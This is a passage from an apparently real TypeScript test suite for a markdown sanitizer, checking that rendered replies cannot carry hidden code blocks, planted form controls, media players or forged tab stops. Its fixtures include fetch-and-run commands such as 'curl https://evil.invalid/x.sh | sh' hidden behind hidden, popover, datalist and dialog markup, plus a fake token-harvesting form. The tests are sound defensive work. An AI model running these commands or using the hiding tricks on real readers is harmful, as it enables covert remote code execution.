      /\b(color|size|face)=/i,
    ],
    [
      'a rule that paints itself',
      '<hr color="red" size="20">separated',
      'separated',
      /\b(color|size)=/i,
    ],
    [
      'a cell with a picture painted behind it',
      '<table><tr><td background="x.png">over an image</td></tr></table>',
      'over an image',
      /background/i,
    ],
    [
      'a table cell painted over the theme',
      '<table><tr><td bgcolor="black">black on black</td></tr></table>',
      'black on black',
      /bgcolor/i,
    ],
    [
      'a paragraph that is in the document but not on the screen',
      '<p hidden>you cannot see me</p>',
      'you cannot see me',
      /hidden/i,
    ],
    [
      'the same with an explicit empty value',
      '<p hidden="">also invisible</p>',
      'also invisible',
      /hidden/i,
    ],
    ['an upper-case attribute name', '<P HIDDEN>upper</P>', 'upper', /hidden/i],
    [
      'the same trick in this decade’s spelling',
      '<p popover>invisible until something shows me</p>',
      'invisible until something shows me',
      /popover/i,
    ],
    [
      'a popover with an explicit state, and its invoker',
      '<p popover="manual">gone</p><button popovertarget="p" popovertargetaction="show">go</button>',
      'gone',
      /popover/i,
    ],
    [
      'a subtree taken out of the accessibility tree and out of focus',
      '<div inert>visible, unreadable, unreachable</div>',
      'visible, unreadable, unreachable',
      /inert/i,
    ],
    [
      'content that adds itself to the tab order',
      '<span tabindex="0">an unexpected tab stop</span>',
      'an unexpected tab stop',
      /tabindex/i,
    ],
    [
      'content that jumps the whole page’s tab order',
      '<div tabindex="1">before every real control</div>',
      'before every real control',
      /tabindex/i,
    ],
    [
      'a negative tabindex, which is still ours to write and not content’s',
      '<span tabindex="-1">quiet</span>',
      'quiet',
      /tabindex/i,
    ],
  ];

  for (const [what, payload, survives, attr] of forged) {
    it(`strips ${what}`, () => {
      const html = renderMarkdown(payload);
      expect(html).not.toMatch(attr);
      // …and the message itself is untouched: this strips attributes, not text
      expect(html).toContain(survives);
    });
  }

  it('the TEXT survives its attributes — nothing this strips eats the message', () => {
    // #466/#598 wrote this row as "a `<font>` is emptied, not deleted", and it
    // asserted `<font>`. #612 then took the tag as well, so the element is gone
    // too — but the property both changes actually promise is the one about the
    // READER, and it is unchanged: whatever the reply said is still on screen.
    // Rewritten to say that rather than deleted, because it is still the thing
    // that stops a "strip it all" fix being a worse bug than the one it closes.
    const html = renderMarkdown('<font color="red" size="7">still here</font>');
    expect(html).toContain('still here');
    expect(html).not.toMatch(/\b(color|size)=/i);
  });

  // The case with teeth. BOTH surfaces wrap EVERY `<pre>` in a header with a
  // Copy button, deliberately — the forged-wrapper variant is closed by the
  // guard pass running first, so a `<pre>` is wrapped whatever it claimed to
  // be. A surviving `hidden` therefore turns that into a code block whose
  // header and Copy button are visible and whose CODE is not, and the handler
  // reads `pre.textContent` at click time: a clipboard the reader cannot
  // inspect before pasting it into a shell.
  //
  // TWO spellings, because closing `hidden` alone left this open one attribute
  // over: Chromium's UA sheet hides `[popover]:not(:popover-open)` exactly as it
  // hides `[hidden]`, and nothing in the renderer's CSS sets `display` on a
  // `<pre>`. Found in review, after the first version of this block was green.
  const PAYLOAD = 'curl https://evil.invalid/x.sh | sh';
  const HOSTILE_PRE: Array<[string, string]> = [
    ['hidden', `<pre hidden>${PAYLOAD}</pre>`],
    ['popover', `<pre popover>${PAYLOAD}</pre>`],
  ];

  for (const [attr, markup] of HOSTILE_PRE) {
    it(`a ${attr} code block cannot hand the viewer’s Copy button invisible code`, () => {
      const { fragment } = decorateDocument(renderMarkdown(markup), LABELS, (href) =>
        classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
      );
      const host = document.createElement('div');
      host.append(fragment);
      const pre = host.querySelector('pre');
      // The decoration really did happen — otherwise "the `<pre>` is not
      // hidden" would be a sentence about a document with no code block in it.
      expect(host.querySelector('.doc-code-copy')).not.toBeNull();
      expect(pre).not.toBeNull();
      expect(pre?.hasAttribute(attr)).toBe(false);
      // and what the button would copy is what the reader can see
      expect(pre?.textContent).toContain(PAYLOAD);
    });

    it(`and neither can a ${attr} one in the feed`, () => {
      const html = decorateFeedMarkdown(renderMarkdown(markup), FEED_LABELS);
      const host = document.createElement('div');
      host.innerHTML = html;
      const pre = host.querySelector('pre');
      expect(host.querySelector('.feed-code-copy')).not.toBeNull();
      expect(pre).not.toBeNull();
      expect(pre?.hasAttribute(attr)).toBe(false);
      expect(pre?.textContent).toContain(PAYLOAD);
    });
  }

  it('loses nothing markdown can emit: GFM writes none of them', () => {
    // The measurement that made STRIP safe, as a test — the same shape as the
    // `style` and ARIA blocks'. If a `marked` bump ever starts emitting one of
    // these, this reds before the decision behind the profile quietly stops
    // being true.
    const html = renderMarkdown(
      [
        '# H',
        '',
        '| left | centre | right |',
        '|:-----|:------:|------:|',
        '| 1 | 2 | 3 |',
        '',
        '- [x] done',
        '- [ ] todo',
        '',
        '~~gone~~ and [a link](https://example.invalid/x)',
        '',
        '```ts',
        'const x = 1;',
        '```',
        '',
        '> quote',
        '',
        '![pic](./local.png)',
        '',
        '<https://auto.link/>',
        '',
        '---',
      ].join('\n')
    );
    expect(html).not.toMatch(/\b(color|bgcolor|background|face|size|tabindex)=/i);
    expect(html).not.toMatch(/\s(hidden|popover|inert)\b/i);
    // …and the formatting that makes it markdown is all still there
    expect(html).toContain('<h1>H</h1>');
    expect(html).toContain('<table>');
    expect(html).toContain('align="right"');
    // the task-list marker is a glyph, not an `<input>` (#612 forbids the tag)
    expect(html).toContain('☐ todo');
    expect(html).toContain('language-ts');
    expect(html).toContain('<hr>');
  });

  it('the surfaces’ OWN tab stops still land — this closes a channel, not the keyboard', () => {
    // The half of the change that could break something real. Every `tabindex`
    // a surface needs is written AFTER the sanitizer: `decorateTables` gives
    // its scroll container one (a scroll box only a mouse can reach is
    // unreachable), `decorateLinks` puts one back on a link it did not block
    // (a blocked one keeps neither `href` nor a tab stop), and the feed's Copy
    // button takes itself OUT of the tab order
    // with `-1` because the conversation is one tab stop (#174). All three must
    // survive — while the forged one in the same document does not.
    const { fragment } = decorateDocument(
      renderMarkdown(
        '[docs](./other.md)\n\n<span tabindex="0">forged</span>\n\n| a |\n|---|\n| 1 |\n'
      ),
      LABELS,
      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
    );
    const host = document.createElement('div');
    host.append(fragment);
    expect(host.querySelector('a')?.getAttribute('tabindex')).toBe('0');
    expect(host.querySelector('.doc-table-wrap')?.getAttribute('tabindex')).toBe('0');
    // BY TEXT, for the reason spelled out on the feed half below: a decoration
    // pass can put a `<span>` of its own earlier in document order, and an
    // assertion about THAT span would be green with the profile reverted.
    const forgedInDoc = [...host.querySelectorAll('span')].find((s) => s.textContent === 'forged');
    expect(forgedInDoc).toBeDefined();
    expect(forgedInDoc?.hasAttribute('tabindex')).toBe(false);
    expect(host.textContent).toContain('forged');

    const feed = document.createElement('div');
    feed.innerHTML = decorateFeedMarkdown(
      renderMarkdown('```ts\nconst x = 1;\n```\n\n<span tabindex="0">forged</span>\n'),
      FEED_LABELS
    );
    expect(feed.querySelector('.feed-code-copy')?.getAttribute('tabindex')).toBe('-1');
    // BY TEXT, not `querySelector('span')`: `decorateFeedCodeFences` writes its
    // own `<span class="feed-code-lang">` inside the wrapper that replaces the
    // `<pre>`, so the first span in document order is the language label — and
    // an assertion about IT would be green with the profile reverted. Found in
    // review; the `expect(forged)` line is what keeps the fix honest if the
    // fixture ever stops containing the span at all.
    const forged = [...feed.querySelectorAll('span')].find((s) => s.textContent === 'forged');
    expect(forged).toBeDefined();
    expect(forged?.hasAttribute('tabindex')).toBe(false);
  });
});

describe('content cannot plant a control (#612)', () => {
  // The decision, pinned: the four NATIVE FOCUSABLES (`button`, `input`,
  // `select`, `textarea`) and the three LEGACY TAGS (`center`, `marquee`,
  // `font`) leave the profile, while `<form>` deliberately stays — the CSP's
  // `form-action 'none'` is the layer that answers it, and the block at the top
  // of this file already pins that.
  //
  // `markdown.tsx` carries the reasoning and the corpus measurement (7,587
  // transcripts, 18,313 assistant text blocks: zero bare-in-prose uses of any of
  // the seven, and 9 task-list items — the one construct that made this cost
  // anything at all).
  //
  // WHAT LIVES WHERE. The surface×payload rows are up in the `style` block,
  // riding its `surfaces` table so there is one statement of "every surface
  // enters through the one profile". What is here is what the profile does, the
  // one divergence it had to engineer around, and the claim it does NOT make.

  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };
  const FEED_LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy code' };

  it('the profile forbids every one of them BY NAME — because no flag can', () => {
    // The same shape as the attribute list's pin, and for the same reason: all
    // seven are ordinary members of DOMPurify's html-profile TAG allow-list, so
    // there is no `ALLOW_*` to turn off and each has to be named.
    for (const tag of [
      'button',
      'input',
      'select',
      'option',
      'optgroup',
      'datalist',
      'textarea',
      'center',
      'marquee',
      'font',
      'rp',
    ]) {
      expect(SANITIZE_CONFIG.FORBID_TAGS).toContain(tag);
    }
  });

  it('and that list cannot be edited at runtime either', () => {
    // `FORBID_ATTR` got this treatment when it became the policy; `FORBID_TAGS`
    // is the second array where the policy lives, and freezing one and not the
    // other would leave `SANITIZE_CONFIG.FORBID_TAGS.pop()` re-opening every
    // surface at once with the source still reading as it does.
    expect(Object.isFrozen(SANITIZE_CONFIG.FORBID_TAGS)).toBe(true);
    const forbidden = SANITIZE_CONFIG.FORBID_TAGS;
    expect(forbidden).toBeDefined();
    expect(() => forbidden?.pop()).toThrow();
    expect(SANITIZE_CONFIG.FORBID_TAGS).toContain('button');
  });

  it('the element goes, its children stay — KEEP_CONTENT is what makes this safe', () => {
    // The property the whole decision rests on: forbidding a tag must not eat
    // the message inside it. None of the seven is in DOMPurify's
    // `FORBID_CONTENTS`, so the children are lifted out rather than dropped —
    // and a `<select>`'s `<option>`s become readable text rather than vanishing.
    const nested = renderMarkdown('<button><b>bold</b> and <em>italic</em></button>');
    expect(nested).not.toContain('<button');
    expect(nested).toContain('<b>bold</b>');
    expect(nested).toContain('<em>italic</em>');

    // `option` and `optgroup` are forbidden alongside `select` precisely so
    // this sentence is literally true: forbidding only the parent hoisted them
    // out as ORPHANED ELEMENTS, not as text, and "readable" would have been a
    // word doing work no assertion could check. Found in review.
    const dropdown = renderMarkdown(
      '<select><option>alpha</option><optgroup label="g"><option>beta</option></optgroup></select>'
    );
    expect(dropdown).not.toMatch(/<(select|option|optgroup)\b/);
    expect(dropdown).toContain('alpha');
    expect(dropdown).toContain('beta');

    const centred = renderMarkdown('<center><h2>Announcement</h2></center>');
    expect(centred).not.toContain('<center');
    expect(centred).toContain('<h2>Announcement</h2>');
  });

  it('the UA-hidden tags go too — `hidden` respelled as an element', () => {
    // #608 closed `hidden` and had to be told in review that `popover` was the
    // same attack one ATTRIBUTE over. These are the same shape one TAG over,
    // and they were found the same way.
    //
    // `<datalist>` is `display: none` in the HTML rendering spec, DOMPurify
    // allows it, and `KEEP_CONTENT` keeps its children — so before this it was
    // a `<pre>` that is in the document, in the DOM and in a find, and not on
    // the screen. That is #598's own stated harm for `<p hidden>`, and it is
    // the case with teeth here too: both surfaces put a Copy button on EVERY
    // `<pre>`, so the reader would have got a code header, a working Copy
    // button, and no visible code.
    const hidden = renderMarkdown(
      '<p>visible</p><datalist><pre>curl evil.sh | sh</pre>and more</datalist>'
    );
    expect(hidden).not.toContain('<datalist');
    expect(hidden).toContain('visible');
    // the content is LIFTED OUT, not deleted — now on screen where it belongs
    expect(hidden).toContain('curl evil.sh | sh');
    expect(hidden).toContain('and more');

    // `ruby > rp` is `display: none` as well, and it is the last one in the
    // profile. `<ruby>` and `<rt>` deliberately STAY: they show what they
    // contain, and taking a whole typographic feature to close its parenthesis
    // fallback would be over-reach.
    const ruby = renderMarkdown('<ruby>base<rp>(</rp><rt>anno</rt><rp>)</rp></ruby>');
    expect(ruby).not.toContain('<rp');
    expect(ruby).toContain('<ruby>');
    expect(ruby).toContain('<rt>anno</rt>');
    expect(SANITIZE_CONFIG.FORBID_TAGS).not.toContain('ruby');
    expect(SANITIZE_CONFIG.FORBID_TAGS).not.toContain('rt');
  });

  it('a `<form>` still survives, and its CONTROLS are what this takes from it', () => {
    // Deliberately NOT a `FORBID_TAGS` entry, and this row says why in one
    // place: the block at the top of this file pins `form-action 'none'` as the
    // layer that stops a form submitting, so the tag was never the answer. What
    // changed is that the form is now empty of anything to type into or press —
    // which is the deception half, not the transmission half.
    const html = renderMarkdown(
      '<form action="https://example.invalid" method="post">' +
        'Paste your token:<input name="token"><button>Send</button></form>'
    );
    expect(html).toContain('<form');
    expect(html).not.toContain('<input');
    expect(html).not.toContain('<button');
    expect(html).toContain('Paste your token:');
  });

  it('markdown’s OWN checkbox survives — as a glyph, which is why `input` could go', () => {
    // THE DIVERGENCE, and the one that needed engineering rather than a
    // measurement. `marked` renders `- [ ] todo` as
    // `<li><input disabled="" type="checkbox"> todo</li>`, so `input` is to this
    // list what `align` is to the attribute list — the one member markdown
    // itself emits. `align` had no way out and stayed; this one did, so the
    // renderer draws the marker and the tag goes.
    //
    // If someone deletes `TaskListGlyphRenderer`, this reds HERE, with the
    // reason attached — rather than silently eating the marker from every
    // checklist in the app and leaving a stray leading space.
    const html = renderMarkdown('- [ ] todo\n- [x] done\n');
    expect(html).not.toContain('<input');
    expect(html).toContain('☐ todo');
    expect(html).toContain('☑ done');
    // and it is a MARKER, not a control: nothing focusable, nothing to click
    const host = document.createElement('div');
    host.innerHTML = html;
    expect(host.querySelectorAll('input, button, [tabindex]')).toHaveLength(0);
    expect(host.querySelectorAll('li')).toHaveLength(2);
  });

  it('a forged checkbox does NOT come back as a glyph — the renderer is not a hole', () => {
    // The obvious way to get this wrong: make the substitution a rule about
    // `<input type=checkbox>` rather than about the TOKEN `marked` produces.
    // Raw markup never reaches the renderer — it reaches the sanitizer — so a
    // reply writing the element by hand gets nothing, checked or not.
    const html = renderMarkdown('<input type="checkbox" checked> looks official');
    expect(html).not.toContain('<input');
    expect(html).not.toContain('☑');
    expect(html).toContain('looks official');
  });

  it('loses nothing markdown can emit: GFM writes none of the seven', () => {
    // The measurement that made STRIP safe, as a test — the same shape as the
    // `style`, ARIA and presentational blocks'. If a `marked` bump ever starts
    // emitting one of these, this reds before the decision quietly stops being
    // true. `input` is the one it DOES emit, which is why the row above exists
    // and why this one asserts the glyph rather than the absence of a marker.
    const html = renderMarkdown(
      [
        '# H',
        '',
        '| left | centre | right |',
        '|:-----|:------:|------:|',
        '| 1 | 2 | 3 |',
        '',
        '- [x] done',
        '- [ ] todo',
        '',
        '~~gone~~ and [a link](https://example.invalid/x)',
        '',
        '```ts',
        'const x = 1;',
        '```',
        '',
        '> quote',
        '',
        '![pic](./local.png)',
        '',
        '<https://auto.link/>',
        '',
        '---',
      ].join('\n')
    );
    expect(html).not.toMatch(/<\s*(button|input|select|textarea|center|marquee|font)\b/i);
    // …and the formatting that makes it markdown is all still there
    expect(html).toContain('<h1>H</h1>');
    expect(html).toContain('<table>');
    expect(html).toContain('align="right"');
    expect(html).toContain('☐ todo');
    expect(html).toContain('☑ done');
    expect(html).toContain('language-ts');
    expect(html).toContain('<blockquote>');
    expect(html).toContain('src="./local.png"');
    expect(html).toContain('href="https://auto.link/"');
    expect(html).toContain('<hr>');
  });

  it('a code fence about these tags still renders them as CODE, not as markup', () => {
    // The corpus said every one of the 62 occurrences in 18,313 assistant text
    // blocks was inside a fence or a code span — i.e. an agent EXPLAINING the
    // tag, which is what this app is for. That path never touched the sanitizer
    // (`marked` escapes it first), so this row is green with or without the
    // change and is a GUARD, not evidence: it holds the premise the measurement
    // rests on, so a `marked` bump that stopped escaping fences reds here.
    const html = renderMarkdown('Use `<button>` for that:\n\n```html\n<button>Save</button>\n```\n');
    expect(html).toContain('&lt;button&gt;');
    expect(html).toContain('&lt;button&gt;Save&lt;/button&gt;');
    const host = document.createElement('div');
    host.innerHTML = html;
    expect(host.querySelector('button')).toBeNull();
    expect(host.textContent).toContain('<button>Save</button>');
  });

  it('what this does NOT claim: an ordinary link is still a tab stop', () => {
    // The sentence #598 got burned on, pinned from the other side so it cannot
    // drift back to "every tab stop in a rendered surface is ours". It is not,
    // and it cannot be made so by any tag list that still renders links: GFM
    // emits `<a href>` for every link, and a link with an href is focusable
    // with no `tabindex` at all.
    //
    // What #612 closes is the narrower and true thing — content cannot plant a
    // CONTROL. Both halves are asserted here so neither can be quietly widened.
    const feed = document.createElement('div');
    feed.innerHTML = decorateFeedMarkdown(
      renderMarkdown(
        '[a real link](https://example.invalid/x)\n\n' +
          '<button>press me</button>\n\n' +
          '<input type="text" name="token">\n'
      ),
      FEED_LABELS
    );
    // the link: content’s own, focusable, and deliberately left alone
    const link = feed.querySelector('a');
    expect(link).not.toBeNull();
    expect(link?.getAttribute('href')).toBe('https://example.invalid/x');
    // the controls: gone, message kept
    expect(feed.querySelector('button')).toBeNull();
    expect(feed.querySelector('input')).toBeNull();
    expect(feed.textContent).toContain('press me');

    // The VIEWER answers the link half differently, and that difference is the
    // reason its manual page can promise more than the feed's: `decorateLinks`
    // strips `href` from every link and writes the affordance back itself, so
    // there the stop really is one the viewer put in.
    const { fragment } = decorateDocument(
      renderMarkdown('[docs](./other.md)\n\n<button>press me</button>\n'),
      LABELS,
      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
    );
    const host = document.createElement('div');
    host.append(fragment);
    expect(host.querySelector('a')?.hasAttribute('href')).toBe(false);
    expect(host.querySelector('a')?.getAttribute('tabindex')).toBe('0');
    expect(host.querySelector('button')).toBeNull();
    expect(host.textContent).toContain('press me');
  });
});

describe('content cannot plant a media player, a hot spot or a hidden box (#625)', () => {
  // The decision, pinned. #612 shipped naming its own leftovers: `<audio
  // controls>` / `<video controls>` are focusable media, and `<area href>` in a
  // `<map>` is a tab stop — the viewer chipped them in a decoration pass and the
  // feed had no such pass at all.
  //
  // WHAT THE MEASUREMENT SAID, because that is what chose FORBID over a feed
  // pass (`markdown.tsx`'s seventh block carries it in full). Two corpora, both
  // 2026-08-20: 7,602 transcripts / 18,639 assistant text blocks / 10.2 MB, and
  // 1,182 real `.md` files / 15.4 MB on this machine's project roots. Every one
  // of the 15 + 21 occurrences was inside a code fence or a code span. Bare in
  // prose: ZERO, in both — which is also what prices the viewer's "media not
  // shown" chip at nothing, since it fired on none of the 1,182 documents.
  //
  // WHAT LIVES WHERE. The surface×payload rows are up in the `style` block with
  // #612's, riding the same `surfaces` table — and the row that decided the
  // design is THE UPDATE DIALOG, which renders GitHub's release notes with no
  // decoration pass to add a media chip to. What is here is what the profile
  // does, the boundary it deliberately does not cross (`img`), and the claim it
  // finally makes true.

  const FEED_LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy code' };
  const LABELS: DecorationLabels = {
    copy: 'Copy',
    image: 'Image',
    openInBrowser: 'Open in browser',
    mediaOmitted: 'Media is not shown here',
  };

  /** every payload from the family, in one reply */
  const MEDIA = [
    '<audio controls src="https://evil.test/a.mp3">A</audio>',
    '<video controls><source src="https://evil.test/v.mp4"><track kind="captions" src="c.vtt">B</video>',
    '<picture><source srcset="https://evil.test/a.webp"><img src="./local.png" alt="C"></picture>',
    '<img src="./d.png" usemap="#m" alt="d"><map name="m"><area coords="0,0,9,9" href="https://evil.test" alt="E"></map>',
    '<canvas width="40" height="400"></canvas>',
    '<dialog><pre>curl evil.sh | sh</pre></dialog>',
  ].join('\n\n');

  it('the profile forbids every one of them BY NAME — because no flag can', () => {
    // Same shape as #612's pin and for the same reason: every one of these is
    // an ordinary member of DOMPurify's html-profile TAG allow-list, verified
    // against the shipped 3.4.12, so there is no `ALLOW_*` to turn off.
    for (const tag of [
      'audio',
      'video',
      'source',
      'track',
      'picture',
      'map',
      'area',
      'canvas',
      'dialog',
    ]) {
      expect(SANITIZE_CONFIG.FORBID_TAGS).toContain(tag);
      expect(renderMarkdown(`<${tag}>x</${tag}>`)).not.toMatch(new RegExp(`<\\s*${tag}\\b`, 'i'));
    }
  });

  it('`iframe`, `embed` and `object` need NO entry — they were never in the profile', () => {
    // The obvious list to copy is the viewer's `stripMedia`, which names all
    // three. Adding them here would be a line that reads as protection and does
    // nothing. What would actually notice the profile changing upstream is this
    // test, so the difference is pinned rather than papered over with entries.
    for (const tag of ['iframe', 'embed', 'object', 'param']) {
      expect(SANITIZE_CONFIG.FORBID_TAGS).not.toContain(tag);
    }
    expect(renderMarkdown('<iframe src="https://evil.test"></iframe>')).not.toContain('<iframe');
    expect(renderMarkdown('<embed src="x.swf" type="application/x-shockwave-flash">')).not.toContain(
      '<embed'
    );
    // `object` keeps its children, which is `KEEP_CONTENT` doing the same job
    // it does for everything above.
    const obj = renderMarkdown('<object data="x.pdf">fallback prose</object>');
    expect(obj).not.toContain('<object');
    expect(obj).toContain('fallback prose');
    // and inline SVG, which §5.30 settles the other way round ("SVG via `<img>`
    // and never inlined so it cannot carry script")
    expect(renderMarkdown('<svg onload="x()"><circle r="9"/></svg>')).not.toContain('<svg');
  });

  it('`audio` and `video` take their children WITH them — the one divergence', () => {
    // #612's headline property is "the element goes, its children stay"
    // (`KEEP_CONTENT`), and it is NOT true of these two. DOMPurify's default
    // `FORBID_CONTENTS` names `audio` and `video` (alongside `iframe`,
    // `noembed`, `noframes`, `plaintext`, `xmp` — the elements whose inner text
    // the parser can re-read as markup), so forbidding the tag deletes the
    // fallback prose inside it. Verified against the shipped 3.4.12 with this
    // exact config, which is how it was found: the surface×payload rows were
    // written expecting the fallback and went red.
    //
    // NOT OVERRIDDEN, deliberately. `FORBID_CONTENTS` is settable, and setting
    // it would mean owning an upstream security default in this file — the last
    // paragraph of `SANITIZE_CONFIG`'s comment refuses exactly that trade. The
    // cost is measured instead: zero bare-in-prose media in 7,602 transcripts
    // and 1,182 real `.md` files, and what `<video>`'s children ARE by spec is
    // a message about a capability this app has decided not to have.
    const media = renderMarkdown(
      'Watch:\n\n<video controls><source src="v.mp4">your browser cannot play this</video>'
    );
    expect(media).not.toMatch(/<\s*(video|source)\b/i);
    expect(media).not.toContain('your browser cannot play this');
    // …and it takes ONLY its own children — the prose around it is untouched,
    // which is the line between this and a sanitizer that blanks the block.
    expect(media).toContain('Watch:');
  });

  it('every other tag on the list keeps its children — KEEP_CONTENT, as #612 has it', () => {
    // `<picture>` degrades to its `<img>` fallback, which is exactly what the
    // element is FOR — and `img` is deliberately not on the list.
    const pic = renderMarkdown(
      '<picture><source srcset="a.webp" type="image/webp"><img src="./local.png" alt="a shot"></picture>'
    );
    expect(pic).not.toMatch(/<\s*(picture|source)\b/i);
    expect(pic).toContain('src="./local.png"');

    // `<dialog>` is the UA-hidden case: forbidding it does not delete the
    // `<pre>`, it UNCOVERS it. The code the reader could not see is now on the
    // screen next to the Copy button that would have copied it.
    const hidden = renderMarkdown('<p>visible</p><dialog><pre>curl evil.sh | sh</pre></dialog>');
    expect(hidden).not.toContain('<dialog');
    expect(hidden).toContain('<pre>curl evil.sh | sh</pre>');

    // `map` and `area` go together for #612's `option`/`optgroup` reason:
    // forbidding the parent alone hoists the hot spots out as orphaned
    // elements rather than removing them.
    const imap = renderMarkdown('<map name="m"><area coords="0,0,9,9" href="https://evil.test"></map>');
    expect(imap).not.toMatch(/<\s*(map|area)\b/i);
  });

  it('every tab stop content can create is a link, a disclosure triangle, or ours', () => {
    // THE CLAIM #598 REACHED FOR AND #612 HAD TO STRIKE OUT, pinned this time
    // instead of asserted — because the way it went false the first time was by
    // being written into a comment and not re-checked when the next payload
    // arrived.
    //
    // The selector is the HTML "focusable without a tabindex" set as it exists
    // after this change. Verified in Chromium 149 rather than reasoned about:
    // `<audio controls>` takes focus and lays out at 300×54, the same element
    // without `controls` does not, and an `<area href>` in an applied `<map>`
    // really is a stop. jsdom does not implement focusability, so this row asks
    // the question the only way a unit test can — of the ELEMENTS.
    const FOCUSABLE_BY_DEFAULT =
      'a[href], area[href], audio[controls], video[controls], button, input, select, textarea, summary, iframe, embed, object, [contenteditable], [tabindex]';
    const feed = document.createElement('div');
    feed.innerHTML = decorateFeedMarkdown(
      renderMarkdown(
        `${MEDIA}\n\n[a real link](https://example.invalid/x)\n\n<details><summary>more</summary>body</details>\n`
      ),
      FEED_LABELS
    );
    const all = [...feed.querySelectorAll(FOCUSABLE_BY_DEFAULT)];
    // "OR OURS" IS THE THIRD CLAUSE, and it is a real one rather than an escape
    // hatch: `decorateFeedCodeFences` puts a Copy button on the `<pre>` this
    // payload smuggled inside a `<dialog>` — the feed's own element, in the
    // feed's own `feed-` namespace, and deliberately `tabindex="-1"` so it is
    // reachable by the fence's own keys and not by Tab.
    const ours = all.filter((el) => el.className.toString().startsWith('feed-'));
    expect(ours).toHaveLength(1);
    expect(ours[0]?.getAttribute('tabindex')).toBe('-1');

    const stops = all.filter((el) => !ours.includes(el));
    // NON-VACUOUS: the two legitimate stops really are there, so "and nothing
    // else" is a statement about the payload and not about an empty container.
    expect(stops.map((el) => el.tagName.toLowerCase()).sort()).toEqual(['a', 'summary']);
    expect(stops.find((el) => el.tagName === 'A')?.getAttribute('href')).toBe(
      'https://example.invalid/x'
    );
    // …and the reply is still readable where `KEEP_CONTENT` applies. `A` and `B`
    // are gone WITH their media elements (see the `FORBID_CONTENTS` row above);
    // the `<dialog>`'s `<pre>` is not — it is uncovered.
    expect(feed.textContent).toContain('curl evil.sh | sh');
  });

  it('loses nothing markdown can emit: GFM writes no media, and `![]()` is still an image', () => {
    // #612's `input` is the lesson this row exists for — one of its eleven tags
    // WAS emitted by `marked`, and forbidding it without engineering around it
    // would have eaten every checklist in the app. Nothing in this family has
    // that problem, and this is the assertion rather than the sentence.
    const html = renderMarkdown(
      [
        '# H',
        '',
        '![pic](./local.png)',
        '',
        '| left | right |',
        '|:-----|------:|',
        '| 1 | 2 |',
        '',
        '- [ ] todo',
        '',
        '<details><summary>more</summary>body</details>',
        '',
        '[a link](https://example.invalid/x)',
      ].join('\n')
    );
    expect(html).not.toMatch(/<\s*(audio|video|source|track|picture|map|area|canvas|dialog)\b/i);
    // THE BOUNDARY: `img` is markdown's own — `marked` writes one for every
    // `![alt](src)`, and the repo scan behind this decision found three real
    // READMEs writing `<img src>` by hand in prose. It stays allowed, and this
    // is the line that reds if a later sweep takes it.
    expect(html).toContain('src="./local.png"');
    expect(html).toContain('alt="pic"');
    expect(renderMarkdown('<img src="x.png" alt="by hand">')).toContain('<img');
    // and the rest of the surface is untouched
    expect(html).toContain('<table>');
    expect(html).toContain('☐ todo');
    expect(html).toContain('<details>');
    expect(html).toContain('<summary>more</summary>');
    expect(html).toContain('href="https://example.invalid/x"');
  });

  it('a code fence about a media tag still renders it as CODE, not as markup', () => {
    // The premise every number in the measurement rests on: all 36 occurrences
    // across both corpora were an agent or a README EXPLAINING the tag inside a
    // fence or a span, where `marked` escapes it and the sanitizer never sees an
    // element. Green with or without the change — a GUARD, not evidence — so a
    // `marked` bump that stopped escaping fences reds here.
    const html = renderMarkdown('Use `<video>` for that:\n\n```html\n<video controls></video>\n```\n');
    expect(html).toContain('&lt;video&gt;');
    const host = document.createElement('div');
    host.innerHTML = html;
    expect(host.querySelector('video')).toBeNull();
    expect(host.textContent).toContain('<video controls></video>');
  });

  it('the viewer’s media chip is belt-and-braces now, not the layer', () => {
    // `stripMedia` stays, and this row says exactly what it is worth so a green
    // run is not read as more than it is: nothing it looks for survives the
    // profile any more, so through the real pipeline it fires on nothing…
    const { fragment } = decorateDocument(
      renderMarkdown('The demo:\n\n<video controls src="v.mp4">no video</video>'),
      LABELS,
      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
    );
    const host = document.createElement('div');
    host.append(fragment);
    expect(host.querySelector('video')).toBeNull();
    expect(host.querySelector('.doc-media-chip')).toBeNull();
    // The reader gets the prose around it and nothing where the player was —
    // measured at zero real documents on this machine, and the honest statement
    // of what the viewer traded for closing the feed and the update dialog.
    expect(host.textContent).toContain('The demo:');
    expect(host.textContent).not.toContain('no video');

    // …and it still does its job when called DIRECTLY with markup that reached a
    // decoration pass from somewhere other than `renderMarkdown`, which is the
    // only reason to keep it. `document-render.test.ts` owns the detail; this
    // pins the RELATIONSHIP, so deleting the function reds here too.
    const raw = document.createElement('div');
    raw.innerHTML = '<video src="https://evil.test/v.mp4"></video>';
    stripMedia(raw, LABELS);
    expect(raw.querySelector('video')).toBeNull();
    expect(raw.querySelector('.doc-media-chip')?.textContent).toBe(LABELS.mediaOmitted);
  });
});

describe('there is exactly one markdown pipeline', () => {
  it('no other production file imports marked or dompurify', () => {
    // §5.30 states the shared renderer as a REQUIREMENT: "The viewer uses the
    // same module and the same sanitizer configuration — stated as a
    // requirement because two pipelines would drift, and the security
    // configuration would drift with them." This test is that sentence,
    // enforced. Modelled on `shared/ipc/refusal.test.ts`'s brand-uniqueness
    // check, which reads source rather than trusting a comment.
    const root = path.join(process.cwd(), 'src');
    const offenders: string[] = [];
    const walk = (dir: string): void => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) {
          walk(full);
          continue;
        }
        if (!/\.tsx?$/.test(entry.name) || /\.test\.tsx?$/.test(entry.name)) continue;
        // Any spelling that reaches either library: `from '…'`, a double-quoted
        // import, `require('…')`, a dynamic `import('…')`. A test whose whole
        // job is "there is exactly one pipeline" should not be defeated by a
        // quote character.
        if (/['"](marked|dompurify)['"]/.test(fs.readFileSync(full, 'utf8'))) {
          offenders.push(path.relative(root, full).replace(/\\/g, '/'));
        }
      }
    };
    walk(root);
    expect(offenders.sort()).toEqual(['renderer/src/lib/markdown.tsx']);
  });
});
